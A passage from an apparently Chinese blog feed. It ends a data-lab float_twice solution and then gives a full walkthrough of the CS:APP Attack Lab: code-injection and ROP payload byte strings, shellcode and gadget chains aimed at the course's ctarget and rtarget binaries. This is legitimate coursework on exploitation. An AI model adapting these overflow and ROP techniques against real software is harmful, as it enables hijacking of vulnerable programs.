title="15.float_twice"></a>15.float_twice</h2><p>返回一个无符号浮点数的两倍</p><p>对于非规格化数，尾数左移1位就相当于乘2</p><p>对于规格化数，阶码加一即可</p><p>对于NaN，返回原值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_twice</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)==<span class="hljs-number">0</span>)  <span class="hljs-comment">//阶码为0，非规格化数</span><br>uf=((uf&amp;<span class="hljs-number">0x007fffff</span>)&lt;&lt;<span class="hljs-number">1</span>)|(uf&amp;<span class="hljs-number">0x80000000</span>);<span class="hljs-comment">//尾数域左移一位，别忘了符号</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)!=<span class="hljs-number">0x7f800000</span>) <span class="hljs-comment">//不是NaN ，阶码不是全1 </span><br>uf=uf+<span class="hljs-number">0x800000</span>;<span class="hljs-comment">//阶码+1，2^(1+1)=2*2  </span><br>  <span class="hljs-keyword">return</span> uf;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试结果截图"><a href="#测试结果截图" class="headerlink" title="测试结果截图"></a>测试结果截图</h2><p><img src="/2021/07/04/lab2_datalab/image-20210407110327739.png" alt="image-20210407110327739"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Attack lab</title>
    <link href="/2021/07/02/Attack_lab/"/>
    <url>/2021/07/02/Attack_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Attack-lab"><a href="#Attack-lab" class="headerlink" title="Attack lab"></a>Attack lab</h1><h2 id="实验概括"><a href="#实验概括" class="headerlink" title="实验概括"></a>实验概括</h2><p>要求你进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p><p>文件列表：<br>|文件|用途|<br>| —- | —- |<br>|ctarget|用来做Code injection攻击的程序，phase1-3|<br>|rtarget|用来做ROP攻击的程序,phase 4-5|<br>|cookie.txt|作为攻击的标识符|<br>|hex2raw|用来生成工具字符串|<br>|farm.c|用于生成面向返回的编程攻击|</p><h2 id="预备知识——缓冲区溢出"><a href="#预备知识——缓冲区溢出" class="headerlink" title="预备知识——缓冲区溢出"></a>预备知识——缓冲区溢出</h2><p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p><p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p><p><img src="/2021/07/02/Attack_lab/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" alt="img"></p><p><img src="/2021/07/02/Attack_lab/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" alt="img"></p><h2 id="预备知识——ROP攻击"><a href="#预备知识——ROP攻击" class="headerlink" title="预备知识——ROP攻击"></a>预备知识——ROP攻击</h2><h3 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h3><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p><p>（1）<strong>栈随机化</strong></p><p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p><p>（2）<strong>栈破坏检测</strong></p><p>最近的GCC版本在产生的代码加入了一种<code>栈保护者</code>机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p>（3）<strong>限制可执行代码区域</strong></p><p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p><p>每一段<code>gadget</code>包含一系列指令字节，而且以<code>ret</code>结尾，跳转到下一个<code>gadget</code>，就这样连续的执行一系列的指令代码，对程序造成攻击。</p><p><strong>示例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></td></tr></table></figure><p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, %rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p><p>指令的编码如下所示：</p><p><img src="/2021/07/02/Attack_lab/1433829-d6312f1ce53cf044.png" alt="img"></p><p>movq指令编码</p><p><img src="/2021/07/02/Attack_lab/1433829-2a663eb32fae331a.png" alt="img"></p><p>popq指令编码</p><p><img src="/2021/07/02/Attack_lab/1433829-c713c395456655fa.png" alt="img"></p><p>movl指令编码</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" alt="img"></p><h2 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h2><h3 id="1-phase1"><a href="#1-phase1" class="headerlink" title="1) phase1"></a>1) phase1</h3><ul><li><p><strong>任务目标</strong></p><p>让getbuf()函数返回touch1()</p></li><li><p><strong>实验步骤</strong></p><p>首先对ctarget进行gdb调试</p><p>然后对getbuf 进行反汇编    </p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" alt="image-20210330205208407"></p><p>对touch1进行反汇编</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" alt="image-20210330205255616"></p><p>可知getbuf()开辟了0x28，即40字节的空间，返回地址存在%rsp+0x28的地址，</p><p>而touch1的初始地址为0x004017c0</p><p>所以当我们存入缓冲区的数据，即touch1的初始地址可以覆盖这个返回地址时，我们就可以成功返回touch1了</p><p>攻击序列设置：</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>c0 17 40 00 00 00 00 00</p><p>以小端方式存储于1.txt中</p><p>用hex2raw转化为字符串，执行命令</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" alt="image-20210330210214612"></p></li></ul><h3 id="2-phase2"><a href="#2-phase2" class="headerlink" title="2) phase2"></a>2) phase2</h3><ul><li><p><strong>任务要求</strong></p><p>要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p></li><li><p><strong>实验步骤</strong></p><p>反汇编查看touch2地址</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" alt="image-20210330211924002"></p><p>要求我们把参数设置为cookie，即把%rdi的值改为cookie，再执行touch2. 即ret touch2的地址。</p><p>转化为汇编代码保存在1.s中，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure><p>用<code>gcc -c 1.s -o 1.o</code>指令转化为机器代码</p><p>并将其反汇编，保存在2.txt中，2.txt如图</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" alt="image-20210331210915437"></p><p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p><p><img src="/2021/07/02/Attack_lab/image-20210412193826843.png" alt="image-20210412193826843"></p><p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" alt="image-20210331211305114"></p><p><img src="/2021/07/02/Attack_lab/1433829-fa485a0533812b76.png" alt="img"></p><p>利用raw2hex转化为字符串</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" alt="image-20210331211454524"></p></li></ul><h3 id="3-phase3"><a href="#3-phase3" class="headerlink" title="3) phase3"></a>3) phase3</h3><ul><li><p><strong>任务要求</strong></p><p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p><p><img src="/2021/07/02/Attack_lab/image-20210412202523955.png" alt="image-20210412202523955"></p></li><li><p><strong>实验步骤</strong></p><p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p><p>所以注入代码为,保存在cs.s中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></td></tr></table></figure><p>汇编和反汇编</p><p><img src="/2021/07/02/Attack_lab/image-20210412203205921.png" alt="image-20210412203205921"></p><p><img src="/2021/07/02/Attack_lab/image-20210412203220388.png" alt="image-20210412203220388"></p><p>利用man ascii将cookie转化为16进制</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>所以，注入序列为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>将其保存在touch_3.txt中，执行指令，可得：</p><p><img src="/2021/07/02/Attack_lab/image-20210412203956357.png" alt="image-20210412203956357"></p></li></ul><h3 id="4-phase4"><a href="#4-phase4" class="headerlink" title="4) phase4"></a>4) phase4</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到<code>touch2</code>函数。只不过这个我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。</p></li><li><p><strong>实验步骤</strong></p><p>我们需要的代码序列：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></td></tr></table></figure><p>其指令编码为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></td></tr></table></figure><p>在rtarget的反汇编代码中查找</p><p><img src="/2021/07/02/Attack_lab/image-20210412211719953.png" alt="image-20210412211719953"></p><p>所以popq %rax指令起始地址为：0x4019ab</p><p><img src="/2021/07/02/Attack_lab/image-20210412211839599.png" alt="image-20210412211839599"></p><p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p><p>所以得到字符串，保存在touch_4中：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>执行指令：</p><p><img src="/2021/07/02/Attack_lab/image-20210412212407837.png" alt="image-20210412212407837"></p></li></ul><h3 id="5-phase5"><a href="#5-phase5" class="headerlink" title="5) phase5"></a>5) phase5</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们需要做的就是把字符串的起始地址，传送到<code>%rdi</code>,然后调用<code>touch3</code>函数。</p><p>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从<code>farm</code>中我们可以获取到这样一个<code>gadget</code>，<code>lea (%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传送到<code>%rax</code>。</p></li><li><p><strong>实验步骤</strong></p><p>解题思路：</p><p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br> （2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br> （3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br> （4）调用<code>touch3</code>函数</p></li></ul><p>(1) 第一步，获取到<code>%rsp</code>的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></td></tr></table></figure><p>movq %rsp, %rax<code>的指令字节为：</code>48 89 e0<code>, 所以这一步的</code>gadget<code>地址为：</code>0x401a06</p><p>(2) 第二步，将<code>%rax</code>的内容传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>(3) 第三步，将偏移量的内容弹出到<code>%rax</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></td></tr></table></figure><p>popq %rax<code>的指令字节为：</code>58<code>， 其中</code>90<code>为</code>nop<code>指令, 所以这一步的</code>gadget<code>地址为：</code>0x4019cc</p><p>(4) 第四步，将<code>%eax</code>的内容传送到<code>%edx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></td></tr></table></figure><p>movl %eax, %edx<code>的指令字节为:</code>89 c2<code>, 所以这一步的</code>gadget<code>地址为：</code>0x4019dd</p><p>(5) 第五步，将<code>%edx</code>的内容传送到<code>%ecx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></td></tr></table></figure><p>movl %edx, %ecx<code>的指令字节为：</code>89 d1<code>，所以这一步的</code>gadget<code>地址为：</code>0x401a70</p><p>(6) 第六步，将<code>%ecx</code>的内容传送到<code>%esi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></td></tr></table></figure><p>movl %ecx, %esi<code>的指令字节为：</code>89 ce<code>, 所以这一步</code>gadget<code>地址为：</code>0x401a13</p><p>(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到<code>%rax</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></td></tr></table></figure><p>这一步的<code>gadget</code>地址为：<code>0x4019d6</code></p><p>(8) 将字符串首地址<code>%rax</code>传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>整个栈的结构如下：</p><p><img src="/2021/07/02/Attack_lab/1433829-cafcf76d35ef7ba1.png" alt="img"></p><p>所以要输入的字符串为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span 